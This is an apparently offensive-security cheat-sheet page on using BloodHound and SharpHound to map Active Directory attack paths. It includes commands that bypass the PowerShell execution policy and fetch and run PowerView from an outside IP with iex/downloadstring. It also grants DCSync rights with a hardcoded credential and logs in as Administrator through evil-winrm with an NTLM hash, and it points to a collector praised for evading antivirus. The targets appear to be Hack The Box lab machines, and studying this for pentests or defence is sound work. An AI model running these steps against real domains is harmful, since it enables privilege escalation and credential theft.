# BloodHound

## Brief

BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory environment. Attacks can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify.

{% embed url="https://bloodhound.readthedocs.io/en/latest/index.html" %}

## Usage

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux

```bash
neo4j console
# creds = neo4j : neo4j
# forgotten password
locate neo4j | grep auth

bloodhound
```

Now bloodhound needs data, and it does so by using an ingestor called SharpHound, you should download, move and execute that script on your domain user that you compromised by typing :

```powershell
powershell -ep bypass
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain $TARGETDOMAIN -ZipFileName bloodhound.zip
```

Once you finish that, copy the zip file to your system, and feed it to bloodhound through drag and drop or import data functionality.

***

## WriteDACL

```bash
iex(new-object net.webclient).downloadstring('http://10.10.14.4:9090/PowerView.ps1')

$pass = convertto-securestring 'abc123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\john', $pass)

Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -Rights DCSync

Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```

## RustHound

{% embed url="https://github.com/OPENCYBER-FR/RustHound" %}
No AV detection and **cross-compiled**.
{% endembed %}
